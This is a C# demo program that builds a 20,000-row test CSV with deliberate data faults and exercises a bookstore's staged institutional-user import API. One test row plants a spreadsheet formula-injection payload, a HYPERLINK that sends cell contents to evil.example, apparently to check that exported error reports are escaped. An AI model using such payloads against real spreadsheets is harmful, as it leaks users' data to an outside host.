using System.Globalization;
using System.Net.Http.Headers;
using System.Net.Http.Json;
using System.Security.Cryptography;
using System.Text;
using Bookstore.Institutional.Import;
using Microsoft.Data.SqlClient;
using Microsoft.EntityFrameworkCore;
using Microsoft.EntityFrameworkCore.Storage;

CultureInfo.CurrentCulture = CultureInfo.InvariantCulture;
string connectionString = Environment.GetEnvironmentVariable("BOOKSTORE_DB")
    ?? "Server=localhost;Database=BookstoreDb;Trusted_Connection=True;TrustServerCertificate=True";
string workDir = Path.Combine(Path.GetTempPath(), "bookstore-cd22");
Directory.CreateDirectory(workDir);

// Setup: institution 7 (a new school chain) with the unit codes from the unit tree, and one existing user
DbContextOptions<BookstoreContext> options = new DbContextOptionsBuilder<BookstoreContext>().UseSqlServer(connectionString).Options;
async Task ResetAsync()
{
    await using BookstoreContext db = new(options);
    await db.Database.EnsureDeletedAsync();
    await db.Database.EnsureCreatedAsync();
    await db.Database.ExecuteSqlRawAsync(await File.ReadAllTextAsync(Path.Combine(AppContext.BaseDirectory, "cd22-01-staging.sql")));
    string[][] units = [["ADM", "Administration"], ["LIB", "Library"], ["HS", "High School"], ["ACC", "Accounting"],
        ["PUR", "Purchasing"], ["ARC", "Archive"], ["SCI", "Science"], ["LIT", "Literature"]];
    db.InstitutionUnits.AddRange(units.Select(u => new InstitutionUnit { InstitutionId = 7, Code = u[0], Name = u[1] }));
    await db.SaveChangesAsync();
    db.InstitutionUsers.Add(new InstitutionUser
    {
        InstitutionId = 7, StaffNumber = "00001", FullName = "Ada Lovelace", Email = "ada@example.com",
        InstitutionUnitId = db.InstitutionUnits.Local.Single(u => u.Code == "SCI").Id, JoinedOn = new DateOnly(2024, 3, 1), SpendingLimit = 85000m
    });
    await db.SaveChangesAsync();
}

// The test file: 20,000 rows with typical Excel damage on known rows (i = row number - 1)
string csvPath = Path.Combine(workDir, "institution-users-20000.csv");
{
    int[] dateFormat = [1201, .. Enumerable.Range(0, 15).Select(k => 2500 + k * 1000)];
    int[] lostZero = [997, 1994, 3017, 5023, 6041, 7055, 8069, 9071, 9800];
    int[] unknownUnit = [.. Enumerable.Range(0, 13).Select(k => 1499 + k * 1301)];
    int[] negativeLimit = [.. Enumerable.Range(0, 10).Select(k => 1999 + k * 1777)];
    int[] duplicatePairs = [.. Enumerable.Range(0, 7).Select(k => 3100 + k * 2203)];
    int future = 4242, existing = 12345;
    int[] all = [.. dateFormat, .. lostZero, .. unknownUnit, .. negativeLimit, .. duplicatePairs, .. duplicatePairs.Select(x => x + 1), future, existing];
    if (all.Distinct().Count() != all.Length) throw new InvalidOperationException("overlapping test rows");

    string[] codes = ["SCI", "LIT", "LIB", "ACC", "PUR", "HS"];
    DateOnly start = new(2015, 1, 1);
    StringBuilder sb = new("StaffNumber,FullName,Email,UnitCode,JoinedOn,SpendingLimit\n");
    for (int i = 1; i <= 20000; i++)
    {
        string staff = (i + 100).ToString("D5");
        string name = i == future ? "\"=HYPERLINK(\"\"http://evil.example/?d=\"\"&A1,\"\"Click\"\")\"" : $"User {i}";
        string email = duplicatePairs.Contains(i - 1) ? $"user{i - 1}@example.com" : i == existing ? "ada@example.com" : $"user{i}@example.com";
        string unit = unknownUnit.Contains(i) ? "MUS" : codes[i % codes.Length];
        DateOnly joined = start.AddDays(i % 3650);
        string joinedText = dateFormat.Contains(i) ? joined.ToString("dd.MM.yyyy") : i == future ? "2031-01-01" : joined.ToString("yyyy-MM-dd");
        string limit = (negativeLimit.Contains(i) ? -(40000 + i) : 40000 + i).ToString();
        if (lostZero.Contains(i)) staff = staff.TrimStart('0');
        sb.Append($"{staff},{name},{email},{unit},{joinedText},{limit}\n");
    }
    await File.WriteAllTextAsync(csvPath, sb.ToString(), new UTF8Encoding(false));
}

// 1) Naive import
await ResetAsync();
await using (BookstoreContext db = new(options))
await using (FileStream csv = File.OpenRead(csvPath))
{
    try
    {
        await NaiveImport.RunAsync(db, csv, 7);
    }
    catch (Exception ex)
    {
        Console.WriteLine($"naive import: {ex.GetType().Name}: {ex.Message}");
    }
}
await using (BookstoreContext db = new(options))
{
    Console.WriteLine($"naive import saved: {await db.InstitutionUsers.CountAsync(u => u.Email != "ada@example.com")} institution users");
}
Console.WriteLine("---");

// 2) The pipeline
await ResetAsync();
WebApplicationBuilder builder = WebApplication.CreateBuilder(args);
builder.Logging.ClearProviders();
builder.WebHost.UseUrls("http://127.0.0.1:5322");
builder.Services.AddDbContext<BookstoreContext>(o => o.UseSqlServer(connectionString));
builder.Services.AddSingleton(TimeProvider.System);
builder.Services.AddSingleton<ImportQueue>();
builder.Services.AddScoped<ImportProcessor>();
builder.Services.AddHostedService<ImportWorker>();
builder.Services.AddProblemDetails();
WebApplication app = builder.Build();

const int institutionId = 7; // demo: in a real application from the tenant claim

app.MapPost("/user-imports", async (IFormFile file, BookstoreContext db, ImportQueue queue,
    TimeProvider time, CancellationToken ct) =>
{
    if (!Path.GetExtension(file.FileName).Equals(".csv", StringComparison.OrdinalIgnoreCase) || file.Length > 10_000_000)
    {
        return Results.Problem(statusCode: 400, title: "Upload a .csv file up to 10 MB");
    }

    Guid importId = Guid.CreateVersion7();
    string path = ImportStorage.PathFor(importId);
    byte[] hash;
    await using (Stream source = file.OpenReadStream())
    await using (FileStream target = File.Create(path))
    using (IncrementalHash sha = IncrementalHash.CreateHash(HashAlgorithmName.SHA256))
    {
        // write the file to disk without buffering it in memory and hash it in the same pass
        byte[] buffer = new byte[81920];
        int read;
        while ((read = await source.ReadAsync(buffer, ct)) > 0)
        {
            sha.AppendData(buffer, 0, read);
            await target.WriteAsync(buffer.AsMemory(0, read), ct);
        }
        hash = sha.GetHashAndReset();
    }

    InstitutionUserImport import = new()
    {
        Id = importId, InstitutionId = institutionId, FileName = Path.GetFileName(file.FileName), FileHash = hash,
        Status = ImportStatus.Queued, CreatedAt = time.GetUtcNow()
    };
    db.InstitutionUserImports.Add(import);
    try
    {
        await db.SaveChangesAsync(ct);
    }
    catch (DbUpdateException ex) when (ex.InnerException is SqlException { Number: 2601 or 2627 })
    {
        // the same file was already uploaded for this institution: no new import, show the existing one
        File.Delete(path);
        InstitutionUserImport existing = await db.InstitutionUserImports.AsNoTracking()
            .SingleAsync(i => i.InstitutionId == institutionId && i.FileHash == hash, ct);
        return Results.Ok(ImportStatusDto.From(existing, duplicate: true));
    }

    await queue.EnqueueAsync(importId, ct);
    return Results.Accepted($"/user-imports/{importId}", ImportStatusDto.From(import));
}).DisableAntiforgery();

app.MapGet("/user-imports/{id:guid}", async (Guid id, HttpContext http, BookstoreContext db, CancellationToken ct) =>
{
    InstitutionUserImport? import = await db.InstitutionUserImports.AsNoTracking()
        .SingleOrDefaultAsync(i => i.Id == id && i.InstitutionId == institutionId, ct);
    if (import is null)
    {
        return Results.NotFound();
    }
    if (import.Status is ImportStatus.Queued or ImportStatus.Loading or ImportStatus.Validating)
    {
        http.Response.Headers.RetryAfter = "2";
    }
    return Results.Ok(ImportStatusDto.From(import));
});

app.MapGet("/user-imports/{id:guid}/errors.csv", (Guid id, BookstoreContext db) =>
    Results.Stream(async stream =>
    {
        // UTF-8 BOM: so that Excel opens Turkish characters correctly
        await using StreamWriter writer = new(stream, new UTF8Encoding(encoderShouldEmitUTF8Identifier: true))
        {
            NewLine = "\r\n" // RFC 4180
        };
        await writer.WriteLineAsync("RowNumber,StaffNumber,FullName,Email,UnitCode,JoinedOn,SpendingLimit,Errors");
        await using SqlConnection connection = new(db.Database.GetConnectionString());
        await connection.OpenAsync();
        await using SqlCommand command = new("""
            SELECT RowNumber, StaffNumber, FullName, Email, UnitCode, JoinedOn, SpendingLimit, Errors
            FROM dbo.InstitutionUserImportRows r
            JOIN dbo.InstitutionUserImports i ON i.Id = r.ImportId
            WHERE r.ImportId = @id AND i.InstitutionId = @institutionId AND r.Errors IS NOT NULL
            ORDER BY r.RowNumber
            """, connection);
        command.Parameters.AddWithValue("@id", id);
        command.Parameters.AddWithValue("@institutionId", institutionId);
        await using SqlDataReader reader = await command.ExecuteReaderAsync();
        while (await reader.ReadAsync())
        {
            IEnumerable<string> cells = Enumerable.Range(1, 7)
                .Select(i => CsvReport.Cell(reader.IsDBNull(i) ? null : reader.GetString(i)));
            await writer.WriteLineAsync($"{reader.GetInt32(0)},{string.Join(",", cells)}");
        }
    }, "text/csv", $"import-{id}-errors.csv"));

app.MapPost("/user-imports/{id:guid}/commit", async (Guid id, CommitMode mode, BookstoreContext db,
    ImportProcessor processor, CancellationToken ct) =>
{
    await using IDbContextTransaction tx = await db.Database.BeginTransactionAsync(System.Data.IsolationLevel.Serializable, ct);
    InstitutionUserImport? import = await db.InstitutionUserImports
        .SingleOrDefaultAsync(i => i.Id == id && i.InstitutionId == institutionId, ct);
    if (import is null)
    {
        return Results.NotFound();
    }
    if (import.Status != ImportStatus.Validated)
    {
        return Results.Problem(statusCode: 409, title: $"Import is {import.Status}, expected Validated");
    }

    // someone may have added a user with the same email since validation: run the rules again inside the transaction
    await processor.ValidateAsync(id, institutionId, ct);
    int invalid = await db.Database
        .SqlQuery<int>($"SELECT COUNT(*) AS Value FROM dbo.InstitutionUserImportRows WHERE ImportId = {id} AND Errors IS NOT NULL")
        .SingleAsync(ct);
    if (mode == CommitMode.AllOrNothing && invalid > 0)
    {
        return Results.Problem(statusCode: 409, title: $"{invalid} rows have errors; nothing was imported",
            detail: $"Download /user-imports/{id}/errors.csv, fix the rows and upload again.");
    }

    int inserted = await db.Database.ExecuteSqlAsync($"""
        INSERT dbo.InstitutionUsers (InstitutionId, StaffNumber, FullName, Email, InstitutionUnitId, JoinedOn, SpendingLimit)
        SELECT {institutionId}, r.StaffNumber, TRIM(r.FullName), TRIM(r.Email), u.Id,
               CONVERT(date, r.JoinedOn, 23), CONVERT(decimal(19, 4), r.SpendingLimit)
        FROM dbo.InstitutionUserImportRows r
        JOIN dbo.InstitutionUnits u ON u.InstitutionId = {institutionId} AND u.Code = r.UnitCode
        WHERE r.ImportId = {id} AND r.Errors IS NULL
        """, ct);

    import.Status = ImportStatus.Committed;
    import.InvalidRows = invalid;
    import.CommittedRows = inserted;
    await db.SaveChangesAsync(ct);
    await tx.CommitAsync(ct);
    return Results.Ok(ImportStatusDto.From(import));
});

await app.StartAsync();
using HttpClient http = new() { BaseAddress = new Uri("http://127.0.0.1:5322") };

async Task<HttpResponseMessage> Upload()
{
    MultipartFormDataContent form = new();
    StreamContent content = new(File.OpenRead(csvPath));
    content.Headers.ContentType = new MediaTypeHeaderValue("text/csv");
    form.Add(content, "file", "institution-users-20000.csv");
    return await http.PostAsync("/user-imports", form);
}

using HttpResponseMessage up = await Upload();
Console.WriteLine($"upload: {(int)up.StatusCode} Location: {up.Headers.Location}");
Console.WriteLine(await up.Content.ReadAsStringAsync());
string location = up.Headers.Location!.ToString();
string id = location.Split('/')[^1];
bool printedPending = false;
while (true)
{
    using HttpResponseMessage st = await http.GetAsync(location);
    if (st.Headers.RetryAfter is { } retry)
    {
        if (!printedPending)
        {
            ImportStatusDto pending = (await st.Content.ReadFromJsonAsync<ImportStatusDto>())!;
            Console.WriteLine($"status: {pending.Status} Retry-After: {retry}");
            printedPending = true;
        }
        await Task.Delay(200);
        continue;
    }
    Console.WriteLine($"status: {await st.Content.ReadAsStringAsync()}");
    break;
}
using (HttpResponseMessage again = await Upload())
{
    Console.WriteLine($"same file again: {(int)again.StatusCode} {await again.Content.ReadAsStringAsync()}");
}
Console.WriteLine("---");

await using (BookstoreContext db = new(options))
{
    var errors = await db.Database.SqlQuery<ErrorCount>($"""
        SELECT TRIM(value) AS Error, COUNT(*) AS Rows
        FROM dbo.InstitutionUserImportRows CROSS APPLY STRING_SPLIT(Errors, ';')
        WHERE Errors IS NOT NULL
        GROUP BY TRIM(value) ORDER BY COUNT(*) DESC
        """).ToListAsync();
    foreach (ErrorCount e in errors) Console.WriteLine($"{e.Rows,5}  {e.Error}");
}
Console.WriteLine("---");

byte[] report = await http.GetByteArrayAsync($"/user-imports/{id}/errors.csv");
Console.WriteLine($"report starts with BOM: {report.AsSpan().StartsWith(new byte[] { 0xEF, 0xBB, 0xBF })}");
string[] lines = Encoding.UTF8.GetString(report.AsSpan(3)).Split("\r\n", StringSplitOptions.RemoveEmptyEntries);
foreach (string line in lines.Take(6).Concat(lines.Where(l => l.StartsWith("4243,")))) Console.WriteLine(line);
Console.WriteLine($"report rows: {lines.Length - 1}");
Console.WriteLine("---");

foreach (string mode in new[] { "AllOrNothing", "ValidOnly" })
{
    using HttpResponseMessage res = await http.PostAsync($"/user-imports/{id}/commit?mode={mode}", null);
    Console.WriteLine($"commit {mode}: {(int)res.StatusCode} {await res.Content.ReadAsStringAsync()}");
}
await using (BookstoreContext db = new(options))
{
    Console.WriteLine($"institution users: {await db.InstitutionUsers.CountAsync()}");
}
await app.StopAsync();
File.Delete(csvPath);

record ErrorCount(string Error, int Rows);
